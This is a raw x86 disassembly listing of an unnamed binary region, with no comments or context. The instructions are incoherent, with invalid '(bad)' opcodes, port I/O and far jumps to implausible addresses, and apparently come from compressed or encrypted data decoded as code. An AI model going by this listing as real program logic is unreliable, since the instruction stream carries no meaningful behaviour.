  4038e1:	iret   
  4038e2:	xor    edx,esi
  4038e4:	outs   dx,DWORD PTR ds:[esi]
  4038e5:	mov    ds,edx
  4038e7:	les    ebp,FWORD PTR [edx+0x11cfa2d2]
  4038ed:	addr16 xchg ecx,eax
  4038ef:	gs pop ecx
  4038f1:	dec    edi
  4038f2:	sbb    DWORD PTR [edi],esp
  4038f4:	sahf   
  4038f5:	dec    esi
  4038f6:	xchg   ecx,eax
  4038f7:	mov    bl,0x26
  4038f9:	push   0x9dbc2a2b
  4038fe:	or     DWORD PTR [eax+0x2be2fe74],0x2
  403905:	fbstp  TBYTE PTR [ecx]
  403907:	int    0xe7
  403909:	mov    ss,WORD PTR fs:[edx-0x24745b64]
  403910:	adc    al,BYTE PTR [ebp-0x2e14c6d7]
  403916:	cmp    al,0x2e
  403918:	test   edx,esp
  40391a:	jg     0x4038f3
  40391c:	dec    ebx
  40391d:	adc    ch,BYTE PTR [edi-0x25]
  403920:	inc    ecx
  403921:	jnp    0x403928
  403923:	(bad)  
  403924:	sbb    al,0xfe
  403926:	or     al,0x72
  403928:	sti    
  403929:	or     esi,DWORD PTR ds:0x8eb6268e
  40392f:	or     DWORD PTR [esi-0x187c74d1],ebx
  403935:	das    
  403936:	pop    esp
  403937:	mov    esi,0xfee59627
  40393c:	retf   0x845d
  40393f:	sbb    BYTE PTR [eax],dh
  403941:	cwde   
  403942:	add    bl,ah
  403944:	jo     0x40398b
  403946:	inc    edx
  403947:	gs adc eax,0x6ffb27db
  40394d:	es adc esi,DWORD PTR ds:[edx+edx*8]
  403952:	stc    
  403953:	xchg   esp,eax
  403954:	and    DWORD PTR [ecx-0x5fd80260],edx
  40395a:	aam    0xaa
  40395c:	xchg   ecx,eax
  40395d:	jbe    0x403916
  40395f:	adc    bh,BYTE PTR [ebp-0x6e63bd8c]
  403965:	std    
  403966:	popa   
  403967:	push   ss
  403968:	mov    edi,0x1b1386ca
  40396d:	add    ch,BYTE PTR [edx-0x16531a10]
  403973:	push   esp
  403974:	mov    bl,0x59
  403976:	jmp    0x41833acc
  40397b:	jmp    0x1ff51358
  403980:	jmp    0x827d780
  403985:	add    dl,cl
  403987:	sub    BYTE PTR [eax+ecx*8],0xef
  40398b:	adc    DWORD PTR [edx],ecx
  40398d:	sub    ebx,DWORD PTR [ebx]
  40398f:	jo     0x403933
  403991:	out    0x2b,al
  403993:	dec    esp
  403994:	xor    eax,0xc109d247
  403999:	in     al,dx
  40399a:	dec    esp
  40399b:	bound  edi,QWORD PTR [esi+0x62bd39fa]
  4039a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039a2:	setle  BYTE PTR [edx-0x4cdc680a]
  4039a9:	add    edi,DWORD PTR [ebx+edi*8]
  4039ac:	fstp   DWORD PTR [ebx-0x25428688]
  4039b2:	cli    
  4039b3:	pop    ebp
  4039b4:	repnz sub DWORD PTR [ecx+0x504576af],0x3220a26
  4039bf:	jmp    0x4039fc
  4039c1:	neg    BYTE PTR [esi+0x2c]
  4039c4:	aaa    
  4039c5:	out    dx,al
  4039c6:	and    edx,ebx
  4039c8:	mov    ebp,0x37401c48
  4039cd:	call   0xf6f8:0x86e85b11
  4039d4:	jo     0x4039e2
  4039d6:	ss mov edi,0x401ab018
  4039dc:	(bad)  
  4039de:	mov    eax,ds:0xb4813c54
  4039e3:	mov    bh,0x9d
  4039e5:	test   al,0xea
  4039e7:	shr    BYTE PTR [edi+0x7c],0xac
  4039eb:	stos   DWORD PTR es:[edi],eax
  4039ec:	stos   BYTE PTR es:[edi],al
  4039ed:	daa    
  4039ee:	xchg   edi,eax
  4039ef:	pop    esp
  4039f0:	cdq    
  4039f1:	test   al,0xd3
  4039f3:	test   eax,0x4e6a97a3
  4039f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039f9:	js     0x403982
  4039fb:	test   eax,0x7d9b833a
  403a00:	mov    dh,0xa5
  403a02:	pusha  
  403a03:	ficomp WORD PTR [ecx-0x3162fc18]
  403a09:	daa    
  403a0a:	or     bl,ah
  403a0c:	pop    ebp
  403a0d:	aam    0x9
  403a0f:	out    0xad,al
  403a11:	iret   
  403a12:	adc    bl,ah
  403a14:	loopne 0x4039d3
  403a16:	push   esp
  403a17:	or     dl,BYTE PTR [esi-0x5d]
  403a1a:	pop    ebp
  403a1b:	in     al,0x23
  403a1d:	mov    ecx,DWORD PTR [edi]
  403a1f:	(bad)  
  403a20:	jo     0x4039af
  403a22:	int3   
  403a23:	and    BYTE PTR [ecx+edx*2],0x68
  403a27:	cmp    eax,0x81cd83ac
  403a2c:	push   cx
  403a2e:	ins    BYTE PTR es:[edi],dx
  403a2f:	adc    eax,0xf962bf19
  403a34:	inc    edx
  403a35:	rol    DWORD PTR [ecx],1
  403a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a38:	cdq    
  403a39:	test   DWORD PTR [edx],ecx
  403a3b:	ja     0x403a3f
  403a3d:	daa    
  403a3e:	imul   edi,DWORD PTR [ebx-0x14],0x3e057cd4
  403a45:	int    0x95
  403a47:	push   edi
  403a48:	inc    ecx
  403a49:	xchg   BYTE PTR [edi],al
  403a4b:	call   0x5be2:0x3592d913
  403a52:	jecxz  0x403a12
  403a54:	mov    esi,0xe2f5329a
  403a59:	es jmp 0x3659d2ff
  403a5f:	push   ecx
  403a60:	inc    ebp
  403a61:	ror    DWORD PTR [esi],1
  403a63:	mov    esi,0x93c07dd
  403a68:	imul   edx,esp,0xba822589
  403a6e:	dec    esi
  403a6f:	pop    ebp
  403a70:	cdq    
  403a71:	mov    bl,BYTE PTR [edi-0x2f42f83e]
  403a77:	lods   al,BYTE PTR ds:[esi]
  403a78:	cmp    BYTE PTR [ecx+0xc29883a],bl
  403a7e:	inc    eax
  403a7f:	mov    dh,al
  403a81:	fld    TBYTE PTR [ecx+ebx*1+0x13]
  403a85:	sub    al,BYTE PTR [ebx+0x63e4f741]
  403a8b:	cmp    esi,DWORD PTR [ecx+edx*2]
  403a8e:	retf   0xb4c4
  403a91:	shl    BYTE PTR [edi],0xcb
  403a94:	inc    ebx
  403a95:	sbb    eax,0xcf2b3f19
  403a9a:	and    BYTE PTR [ecx],al
  403a9c:	or     bl,BYTE PTR cs:[eax+0xd]
  403aa0:	jo     0x403ac5
  403aa2:	mov    esi,0xc067cf1e
  403aa7:	mov    al,ds:0xcf15a3a7
  403aac:	pop    ds
  403aad:	ss add al,0x5
  403ab0:	sbb    ch,ah
  403ab2:	imul   esp,DWORD PTR ds:0x24223240,0x54f1e631
  403abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403abd:	cmp    BYTE PTR ds:0xfc3399b7,dh
  403ac3:	scas   al,BYTE PTR es:[edi]
  403ac4:	adc    cl,al
  403ac6:	pop    ds
  403ac7:	pop    ss
  403ac8:	push   0x7f
  403aca:	mov    DWORD PTR [edx-0x4f],esp
  403acd:	cdq    
  403ace:	pop    ds
  403acf:	jno    0x403a60
  403ad1:	je     0x403a86
  403ad3:	arpl   di,di
  403ad5:	mov    eax,0x69876a7d
  403ada:	inc    ebx
  403adb:	clc    
  403adc:	fwait
  403add:	cld    
  403ade:	scas   eax,DWORD PTR es:[edi]
  403adf:	ret    0x504d
  403ae2:	push   cs
  403ae3:	ins    BYTE PTR es:[edi],dx
  403ae4:	push   ebp
  403ae5:	mov    al,0xff
  403ae7:	pusha  
  403ae8:	mov    al,ds:0xc6db693f
  403aed:	mov    dl,0x70
  403aef:	or     BYTE PTR [ebx+0x51],al
  403af2:	dec    edi
  403af3:	lea    edx,[edi+0x7c]
  403af6:	retf   0x55b7
  403af9:	mov    bl,0xff
  403afb:	mov    WORD PTR ds:0x2e5f0fc,gs
  403b01:	jmp    0xae91:0x4322319b
  403b08:	mov    WORD PTR [esi+ecx*4],ss
  403b0b:	jno    0x403b81
  403b0d:	sbb    BYTE PTR [eax],dh
  403b0f:	outs   dx,BYTE PTR ds:[esi]
  403b10:	pop    esp
  403b11:	sbb    eax,0xba1dc828
  403b16:	or     edx,DWORD PTR [ebp-0x44]
  403b19:	jo     0x403aa1
  403b1b:	scas   al,BYTE PTR es:[edi]
  403b1c:	shl    BYTE PTR [ecx],cl
  403b1e:	scas   eax,DWORD PTR es:[edi]
  403b1f:	mov    ds:0xcc0f8413,al
  403b24:	dec    eax
  403b25:	jae    0x403ae0
  403b27:	scas   eax,DWORD PTR es:[edi]
  403b28:	fiadd  DWORD PTR [eax+0x70]
  403b2b:	lea    ebp,fs:[eax+0x35]
  403b2f:	retf   0xd875
  403b32:	pop    esp
  403b33:	mul    BYTE PTR [ebp+0x30db3d5f]
  403b39:	nop    esi
  403b3c:	xor    ebp,ebx
  403b3e:	inc    ecx
  403b3f:	nop
  403b40:	je     0x403bb8
  403b42:	jmp    DWORD PTR [esp+ebx*2+0x7e]
  403b46:	mov    ebx,0x9e1ee950
  403b4b:	aam    0x60
  403b4d:	int    0xb8
  403b4f:	cld    
  403b50:	jp     0x403b41
  403b52:	jae    0x403ae6
  403b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b55:	sbb    al,0xf4
  403b57:	inc    edx
  403b59:	cmp    BYTE PTR [esi],dh
  403b5b:	dec    ebx
  403b5c:	dec    ebp
  403b5d:	scas   al,BYTE PTR es:[edi]
  403b5e:	ret    
  403b5f:	retf   
  403b60:	aam    0xa8
  403b62:	in     eax,0xc7
  403b64:	out    dx,al
  403b65:	jbe    0x403b06
  403b67:	push   es
  403b68:	aad    0x9b
  403b6a:	ins    DWORD PTR es:[edi],dx
  403b6b:	test   BYTE PTR [ebx-0x61],0x75
  403b6f:	lods   eax,DWORD PTR ds:[esi]
  403b70:	loop   0x403b47
  403b72:	loop   0x403b49
  403b74:	xchg   ebp,eax
  403b75:	lock out 0x5a,al
  403b78:	inc    edx
  403b79:	mov    ds:0xad9f56b1,al
  403b7e:	arpl   WORD PTR ds:0x24f7,sp
  403b83:	pop    es
  403b84:	outs   dx,BYTE PTR ds:[esi]
  403b85:	pop    ds
  403b86:	dec    esp
  403b87:	fld    TBYTE PTR [edx]
  403b89:	mov    eax,ds:0xb15596f2
  403b8e:	push   es
  403b8f:	pop    esi
  403b90:	je     0x403b3a
  403b92:	mov    bh,0x3a
  403b94:	ficomp DWORD PTR [edi+0x62]
  403b97:	int    0x59
  403b99:	bound  ecx,QWORD PTR [ecx+0x5e5850f7]
  403b9f:	std    
  403ba0:	xchg   esi,eax
  403ba1:	cmp    al,0x2d
  403ba3:	nop
  403ba4:	in     al,dx
  403ba5:	fwait
  403ba6:	dec    ebp
  403ba7:	sbb    BYTE PTR [eax-0x20],0x33
  403bab:	and    eax,0x24418e2b
  403bb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bb1:	jns    0x403c2b
  403bb3:	outs   dx,BYTE PTR ds:[esi]
  403bb4:	mov    bh,0x80
  403bb6:	mov    eax,0xaf61acc
  403bbb:	dec    edi
  403bbc:	lahf   
  403bbd:	iret   
  403bbe:	into   
  403bbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bc0:	jne    0x403bd5
  403bc2:	cmp    bh,BYTE PTR [ebx-0x40]
  403bc5:	mov    cl,0xee
  403bc7:	dec    esi
  403bc8:	or     BYTE PTR [esp+esi*1],0xae
  403bcc:	push   ebx
  403bcd:	enter  0xc4af,0xa6
  403bd1:	aaa    
  403bd2:	or     ch,bl
  403bd4:	sub    BYTE PTR [edx+0x72ad31c],0x9b
  403bdb:	push   cs
  403bdc:	mov    WORD PTR [edx+0x1100a639],ds
  403be2:	je     0x403bca
  403be4:	fldlg2 
  403be6:	mov    esi,0xc431299e
  403beb:	sbb    al,0xf2
  403bed:	jmp    0xba36:0xf69796bf
  403bf4:	xchg   esp,eax
  403bf5:	test   eax,0x31cd28aa
  403bfa:	adc    bh,ah
  403bfc:	in     eax,0xf5
  403bfe:	inc    edx
  403bff:	neg    edx
  403c01:	stos   DWORD PTR es:[edi],eax
  403c02:	mov    eax,ds:0x611819bb
  403c07:	or     esp,edx
  403c09:	mov    WORD PTR [ebx-0x2d],?
  403c0c:	and    ebx,DWORD PTR [eax]
  403c0e:	and    BYTE PTR [ecx],ch
  403c10:	mov    BYTE PTR [ebx],dh
  403c12:	cmp    dh,BYTE PTR [ecx+0x490dab07]
  403c18:	sahf   
  403c19:	or     BYTE PTR [edx+0x38987d1b],cl
  403c1f:	outs   dx,BYTE PTR ds:[esi]
  403c20:	jecxz  0x403c14
  403c22:	sbb    eax,0x6b44ef47
  403c27:	xor    eax,0xe0299a31
  403c2c:	pop    es
  403c2d:	pop    ds
  403c2e:	call   0x2e23:0x12686bcc
  403c35:	sbb    ebx,DWORD PTR [ebp-0x13]
  403c38:	jmp    0xe5f7:0xc1be74b
  403c3f:	dec    edx
  403c40:	jo     0x403c3c
  403c42:	jg     0x403c47
  403c44:	or     edx,DWORD PTR [esi-0x69aa032f]
  403c4a:	outs   dx,DWORD PTR cs:[esi]
  403c4c:	sub    al,0x8e
  403c4e:	fidivr DWORD PTR [ebx+0x7f5cc91c]
  403c54:	push   esp
  403c55:	clc    
  403c56:	lock and DWORD PTR [eax],ebp
  403c59:	pop    ecx
  403c5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c5b:	mov    ebx,0x5fed7c77
  403c60:	xchg   DWORD PTR [esi+edi*1-0xe8d9902],ebp
  403c67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c68:	cmp    edi,DWORD PTR [edi-0x15]
  403c6b:	aad    0xc
  403c6d:	shl    DWORD PTR [ecx+0x16],cl
  403c70:	jg     0x403c7f
  403c72:	mov    ebx,0xf6c2bf19
  403c77:	cmp    al,0xb4
  403c79:	adc    eax,0xd7c130b0
  403c7e:	jp     0x403c31
  403c80:	adc    ebx,ebp
  403c82:	or     al,al
  403c84:	jecxz  0x403c8b
  403c86:	lsl    edx,WORD PTR [ebx+0x37]
  403c8a:	arpl   WORD PTR [edi],sp
  403c8c:	aaa    
  403c8d:	cwde   
  403c8e:	push   esi
  403c8f:	scas   al,BYTE PTR es:[edi]
  403c90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c91:	jns    0x403c33
  403c93:	out    0x85,al
  403c95:	adc    BYTE PTR [edi-0x7ec649b8],dh
  403c9b:	aam    0xf9
  403c9d:	pop    ebx
  403c9e:	lds    esi,FWORD PTR [esi-0x29]
  403ca1:	call   0x473c5245
  403ca6:	aam    0xd8
  403ca8:	xor    DWORD PTR [eax-0x7f],eax
  403cab:	(bad)  [ebp-0x25]
  403cae:	inc    eax
  403caf:	mov    eax,0x5d49c257
  403cb4:	inc    ebp
  403cb5:	mov    BYTE PTR [ebp-0x15673a42],0x77
  403cbc:	mov    eax,0xfb110df5
  403cc1:	(bad)  
  403cc2:	or     DWORD PTR [edx],edi
  403cc4:	push   0xc33cbb28
  403cc9:	xchg   esi,eax
  403cca:	push   ss
  403ccb:	add    ecx,ecx
  403ccd:	jl     0x403c89
  403ccf:	mov    bl,ch
  403cd1:	clc    
  403cd2:	mov    BYTE PTR [ebx],ch
  403cd4:	cmp    eax,0x4897b5c6
  403cd9:	inc    ebp
  403cda:	push   ecx
  403cdb:	push   ds
  403cdc:	dec    eax
  403cdd:	data16 loope 0x403caf
  403ce0:	sbb    DWORD PTR [ebx+0xf],0xffffffd1
  403ce4:	jge    0x403c66
  403ce6:	cmp    DWORD PTR [ebp+0x4e353a1a],esp
  403cec:	int3   
  403ced:	imul   ecx,DWORD PTR [edi+esi*1],0x3d7ddf29
  403cf4:	(bad)  
  403cf5:	cld    
  403cf6:	cwde   
  403cf7:	(bad)  
  403cf8:	cmp    edi,edx
  403cfa:	mov    ebp,0xd3a6de78
  403cff:	mov    ds:0xd49b654d,eax
  403d04:	jbe    0x403d0f
  403d06:	mov    dl,BYTE PTR [ebp-0x59cce980]
  403d0c:	inc    esi
  403d0d:	inc    eax
  403d0e:	int3   
  403d0f:	sbb    ch,BYTE PTR [ebp-0x1e]
  403d12:	dec    edx
  403d13:	fs jp  0x403d6a
  403d16:	mov    al,0x49
  403d18:	inc    ecx
  403d19:	jge    0x403cec
  403d1b:	xor    esp,0x23
  403d1e:	test   DWORD PTR [ebx+0xb39c2f6],0xf559db06
  403d28:	(bad)  
  403d29:	jne    0x403d85
  403d2b:	fwait
  403d2c:	push   esp
  403d2d:	jns    0x403cd7
  403d2f:	ret    0x4700
  403d32:	push   esp
  403d33:	jnp    0x403cfd
  403d35:	cwde   
  403d36:	outs   dx,BYTE PTR ds:[esi]
  403d37:	or     edi,DWORD PTR [edi]
  403d39:	in     al,dx
  403d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d3b:	out    0xdd,eax
  403d3d:	mov    dl,0x58
  403d3f:	icebp  
  403d40:	loopne 0x403d01
  403d42:	fidiv  DWORD PTR [ebx-0x7191b382]
  403d48:	loop   0x403d81
  403d4a:	pop    edi
  403d4b:	into   
  403d4c:	sbb    bh,bh
  403d4e:	enter  0x9b8,0x89
  403d52:	lods   al,BYTE PTR ds:[esi]
  403d53:	pop    edi
  403d54:	mov    al,ds:0xe8aff03d
  403d59:	mov    WORD PTR ds:0x4caba0db,es
  403d60:	out    0xe6,eax
  403d62:	in     eax,0x36
  403d64:	mov    eax,0xc41790f2
  403d69:	inc    ebx
  403d6a:	leave  
  403d6b:	cmp    eax,0x18e5a186
  403d70:	data16 icebp 
  403d72:	lea    ebx,ds:0x8f57d737
  403d78:	inc    ecx
  403d79:	in     al,dx
  403d7a:	cli    
  403d7b:	pop    esi
  403d7c:	adc    eax,0x4c05e515
  403d81:	xor    edx,DWORD PTR [edi]
  403d83:	adc    BYTE PTR [ebp+0x216ec552],cl
  403d89:	dec    esp
  403d8a:	lock pop ds
  403d8c:	sub    DWORD PTR [edi+0x15],eax
  403d8f:	fsubr  DWORD PTR [eax+0x22]
  403d92:	pushf  
  403d93:	pop    edx
  403d94:	es (bad) 
  403d96:	mov    BYTE PTR [edi+0x64247fe4],0x5e
  403d9d:	mov    esi,0x12c10a55
  403da2:	push   0xffffffa3
  403da4:	ins    BYTE PTR es:[di],dx
  403da6:	fcom   QWORD PTR [edi+edi*2+0x8]
  403daa:	cmp    DWORD PTR [ebx],0x145236ed
  403db0:	pop    ds
  403db1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403db2:	adc    eax,0xc8b6d660
  403db7:	sub    ecx,esi
  403db9:	add    eax,0xa5b417bc
  403dbe:	jns    0x403d6d
  403dc0:	sar    edi,1
  403dc2:	sbb    bh,BYTE PTR [eax+eiz*2+0x145f0e2f]
  403dc9:	test   eax,0xc41b5c5f
  403dce:	call   0x48ba:0x9ccb2629
  403dd5:	sub    BYTE PTR ds:0x39045eb0,0xc4
  403ddc:	test   al,0x28
  403dde:	loop   0x403d72
  403de0:	leave  
  403de1:	hlt    
  403de2:	loopne 0x403d97
  403de4:	jne    0x403dfc
  403de6:	fistp  QWORD PTR [edi+0x3b]
  403de9:	sbb    esi,ebp
  403deb:	scas   al,BYTE PTR es:[edi]
  403dec:	stc    
  403ded:	jge    0x403d7a
  403def:	inc    ebx
  403df0:	popf   
  403df1:	add    al,0x3e
  403df3:	mov    esp,0xd7f4ec4d
  403df8:	push   edx
  403df9:	ss icebp 
  403dfb:	xchg   ebx,eax
  403dfc:	cmp    cl,BYTE PTR [eax-0x4bfdb639]
  403e02:	fstp   TBYTE PTR ss:0x79dcd0de
  403e09:	scas   al,BYTE PTR es:[edi]
  403e0a:	dec    esp
  403e0b:	adc    BYTE PTR [esi],0xfa
  403e0e:	sti    
  403e0f:	xchg   edi,eax
  403e10:	cli    
  403e11:	arpl   dx,bx
  403e13:	call   0xf1cc7aeb
  403e18:	mov    dl,0x68
  403e1a:	call   0xc77b:0x43318efc
  403e21:	leave  
  403e22:	into   
  403e23:	in     eax,0x1a
  403e25:	dec    esp
  403e26:	add    al,0x46
  403e28:	adc    BYTE PTR [ecx-0x5ac4efc9],al
  403e2e:	mov    eax,ds:0x52429bd0
  403e33:	rol    DWORD PTR [esi],cl
  403e35:	inc    BYTE PTR [eax+0x4f]
  403e38:	push   ds
  403e39:	jecxz  0x403e70
  403e3b:	scas   al,BYTE PTR es:[edi]
  403e3c:	jbe    0x403dde
  403e3e:	rol    BYTE PTR [edx+0x35fa2ca5],0xaf
  403e45:	fcmovnbe st,st(6)
  403e47:	cmp    ch,BYTE PTR [ebp+edi*4+0x1a]
  403e4b:	ins    DWORD PTR es:[edi],dx
  403e4c:	cdq    
  403e4d:	pushf  
  403e4e:	inc    edi
  403e4f:	push   edx
  403e50:	jae    0x403e20
  403e52:	xchg   ebx,eax
  403e53:	and    BYTE PTR [edi+0x3c1f182a],0x7f
  403e5a:	gs js  0x403e66
  403e5d:	shr    BYTE PTR [edi+0x62],cl
  403e60:	ds sbb ecx,eax
  403e63:	mov    ebx,0x86931171
  403e68:	(bad)  
  403e6a:	xor    cl,bl
  403e6c:	retf   0x955a
  403e6f:	mov    bh,0x8b
  403e71:	push   ecx
  403e72:	mov    edi,0xa38c6100
  403e77:	addr16 pop ebp
  403e79:	xchg   ecx,eax
  403e7a:	mov    edi,0x9903a641
  403e7f:	pop    esi
  403e80:	inc    BYTE PTR [ebx+0x6e]
  403e83:	fcompp 
  403e85:	adc    ah,BYTE PTR [esi+edx*4+0xe]
  403e89:	lods   al,BYTE PTR ds:[esi]
  403e8a:	das    
  403e8b:	(bad)
  403e8e:	call   0xf7b3:0x997a3ffd
  403e95:	push   cs
  403e96:	xor    edi,esi
  403e98:	mov    ds:0x56175338,al
  403e9d:	inc    ebx
  403e9e:	adc    al,0x7
  403ea0:	out    0xe4,al
  403ea2:	pop    DWORD PTR [ecx-0x2460d9ec]
  403ea8:	scas   eax,DWORD PTR es:[edi]
  403ea9:	adc    al,0xb6
  403eab:	inc    edi
  403eac:	pushf  
  403ead:	shr    BYTE PTR [eax-0x14284920],0xa
  403eb4:	and    BYTE PTR [eax-0x23],0x84
  403eb8:	lods   eax,DWORD PTR ds:[esi]
  403eb9:	sbb    ebx,esi
  403ebb:	pop    ecx
  403ebc:	and    DWORD PTR [ebx+esi*8+0x64be0f90],ebp
  403ec3:	mov    bl,0x32
  403ec5:	rcl    ah,0xc9
  403ec8:	(bad)  
  403ec9:	mov    ds:0xc17b6d7c,eax
  403ece:	rol    DWORD PTR [esi+0x20d308f8],1
  403ed4:	repz and ebp,DWORD PTR [esi]
  403ed7:	sbb    al,BYTE PTR [ecx]
  403ed9:	mov    dl,0x4e
  403edb:	xchg   edx,eax
  403edc:	js     0x403f4b
  403ede:	pop    es
  403edf:	cmp    eax,0x3dacf30c
  403ee4:	push   edi
  403ee5:	iret   
  403ee6:	enter  0x7037,0xd2
  403eea:	dec    BYTE PTR [ecx-0x25]
  403eed:	xchg   ebp,eax
  403eee:	pop    es
  403eef:	mov    ds:0x168f6f33,eax
  403ef4:	inc    ebx
  403ef5:	xor    al,0x63
  403ef7:	xchg   esp,eax
  403ef8:	js     0x403ef4
  403efa:	icebp  
  403efb:	lahf   
  403efc:	pop    ds
  403efd:	lock rcr BYTE PTR [edi-0x50df7546],0xdb
  403f05:	mov    ch,0x3b
  403f07:	jp     0x403f59
  403f09:	or     BYTE PTR [bx-0x17],ah
  403f0d:	sbb    BYTE PTR [esi+0x2b612954],0x2f
  403f14:	inc    ebx
  403f15:	push   esi
  403f16:	xchg   esp,eax
  403f17:	pop    ebx
  403f18:	retf   0xfb4b
  403f1b:	sub    eax,0x8288e773
  403f20:	lods   eax,DWORD PTR ds:[esi]
  403f21:	clc    
  403f22:	xor    bl,bl
  403f24:	xor    BYTE PTR [edi],ch
  403f26:	adc    al,0xcc
  403f28:	inc    eax
  403f29:	pushf  
  403f2a:	sar    bh,1
  403f2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f2d:	push   ebp
  403f2e:	mov    edx,0x4dc51e5f
  403f33:	daa    
  403f34:	xchg   ecx,eax
  403f35:	cdq    
  403f36:	jmp    0x403f5c
  403f38:	mov    dh,ch
  403f3a:	xor    al,0x85
  403f3c:	and    al,0x64
  403f3e:	xlat   BYTE PTR ds:[ebx]
  403f3f:	ja     0x403f82
  403f41:	add    cl,BYTE PTR [eax]
  403f43:	scas   eax,DWORD PTR es:[edi]
  403f44:	mov    edi,0xc282ca6f
  403f49:	jnp    0x403eed
  403f4b:	lods   al,BYTE PTR ds:[esi]
  403f4c:	mov    bl,ch
  403f4e:	inc    ebp
  403f4f:	ret    
  403f50:	sti    
  403f51:	inc    esi
  403f52:	test   BYTE PTR ds:0x8f3c5c8e,cl
  403f58:	sahf   
  403f59:	cmp    eax,0x48935963
  403f5e:	iret   
  403f5f:	inc    edi
  403f60:	imul   ebp,DWORD PTR [esi-0x3c9c09c0],0x8fc50905
  403f6a:	cmp    bh,BYTE PTR [ebp-0x25]
  403f6d:	xchg   ebp,eax
  403f6e:	and    al,0xed
  403f70:	push   edi
  403f71:	pusha  
  403f72:	dec    esp
  403f73:	cli    
  403f74:	xchg   edx,eax
  403f75:	push   ecx
  403f76:	(bad)  
  403f77:	pop    ebx
  403f78:	(bad)  
  403f79:	jle    0x403f50
  403f7b:	xchg   esp,eax
  403f7c:	pushf  
  403f7d:	inc    ebx
  403f7e:	ret    
  403f7f:	fwait
  403f80:	mov    eax,0x74b1c54a
  403f85:	add    edx,eax
  403f87:	jge    0x403fdc
  403f89:	jns    0x40400a
  403f8b:	mov    ch,0xed
  403f8d:	addr16 popa 
  403f8f:	retf   
  403f90:	jecxz  0x404002
  403f92:	and    DWORD PTR [eax+0x4b53fdcb],ecx
  403f98:	loopne 0x403f1e
  403f9a:	inc    edx
  403f9b:	outs   dx,DWORD PTR ds:[esi]
  403f9c:	jae    0x403fc2
  403f9e:	or     BYTE PTR [eax*1-0x6e98181],0x90
  403fa6:	icebp  
  403fa7:	pop    ebx
  403fa8:	push   cs
  403fa9:	mov    DWORD PTR [ecx-0x80],ebx
  403fac:	aas    
  403fad:	push   edx
  403fae:	cld    
  403faf:	out    dx,eax
  403fb0:	xor    ch,BYTE PTR ds:0xb48e5213
  403fb6:	push   edi
  403fb7:	ror    DWORD PTR ds:0xe286559,0xa8
  403fbe:	or     DWORD PTR [eax-0x3176958b],esp
  403fc4:	jnp    0x403f85
  403fc6:	xor    al,0x61
  403fc8:	mov    esi,eax
  403fca:	xor    DWORD PTR [ebx+0x2d],ebx
  403fcd:	popa   
  403fce:	lea    ebx,[esp+esi*4]
  403fd1:	mov    ecx,DWORD PTR [eax+ecx*8-0x22c6b1a2]
  403fd8:	and    eax,0xb0221ba0
  403fdd:	push   0xffffff83
  403fdf:	fptan  
  403fe1:	xor    DWORD PTR [edi+edi*2],edi
  403fe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fe5:	loope  0x404010
  403fe7:	or     edi,DWORD PTR [esi]
  403fe9:	jbe    0x404004
  403feb:	add    dl,al
  403fed:	pop    esp
  403fee:	xor    al,0xff
  403ff0:	cmp    al,0xbe
  403ff2:	lds    edx,FWORD PTR [esi-0x3a]
  403ff5:	push   ecx
  403ff6:	dec    edx
  403ff7:	xor    al,0x31
  403ff9:	ins    BYTE PTR es:[edi],dx
  403ffa:	(bad)  
  403ffb:	jb     0x403f8f
  403ffd:	dec    edx
  403ffe:	popf   
  403fff:	pop    esp
  404000:	call   0x300a:0x49726278
  404007:	add    eax,0xf85b0139
  40400c:	aas    
  40400d:	test   BYTE PTR [ebx],cl
  40400f:	push   edi
  404010:	fwait
  404011:	jb     0x403fe7
  404013:	sbb    ebp,DWORD PTR [edi]
  404015:	xor    DWORD PTR [edi+eax*1],ebx
  404018:	xchg   ebx,eax
  404019:	pop    esi
  40401a:	adc    eax,0x9fad4be3
  40401f:	jp     0x404038
  404021:	jae    0x404023
  404023:	sahf   
  404024:	in     eax,dx
  404025:	inc    ebx
  404026:	xor    edx,edx
  404028:	mov    BYTE PTR [esi+0x3b0ed73a],dl
  40402e:	enter  0x9b79,0x1b
  404032:	push   ecx
  404033:	sbb    DWORD PTR [esi-0x1c0aba83],eax
  404039:	lods   eax,DWORD PTR ds:[esi]
  40403a:	cmp    bh,0xf7
  40403d:	ds hlt 
  40403f:	std    
  404040:	retf   
  404041:	sub    bl,bl
  404043:	push   0x31
  404045:	and    edi,DWORD PTR [eax-0x5b85c602]
  40404b:	push   0xe80a1999
  404050:	or     BYTE PTR [edi],cl
  404052:	or     ch,ah
  404054:	mov    ecx,0x43ecbe03
  404059:	std    
  40405a:	add    cl,BYTE PTR [esi+0x15e571a5]
  404060:	repz and eax,0x9ee821ef
  404066:	sahf   
  404067:	xor    dh,ah
  404069:	inc    edi
  40406a:	js     0x4040c7
  40406c:	ins    BYTE PTR es:[edi],dx
  40406d:	das    
  40406e:	fisubr WORD PTR [esi]
  404070:	daa    
  404071:	xchg   esp,eax
  404072:	dec    edi
  404073:	fistp  QWORD PTR [edx+0x74d1ff98]
  404079:	mov    edx,0x7479721c
  40407e:	mov    ch,0xa9
  404080:	xor    edi,DWORD PTR [edi+0x31]
  404083:	fadd   QWORD PTR [edx-0x41]
  404086:	repnz fld TBYTE PTR [ecx+0x30]
  40408a:	mov    gs,WORD PTR [edx]
  40408c:	daa    
  40408d:	sahf   
  40408e:	pop    esi
  40408f:	pusha  
  404090:	sub    eax,0xc5d92e3a
  404095:	rol    BYTE PTR [ecx],1
  404097:	xor    al,0xb9
  404099:	or     al,0xe7
  40409b:	add    BYTE PTR [edx+ecx*2+0x10],cl
  40409f:	sbb    BYTE PTR [ebx+0x2989cffc],0xb7
  4040a6:	jb     0x4040c5
  4040a8:	or     BYTE PTR [edi+0x3775de66],ch
  4040ae:	pop    esi
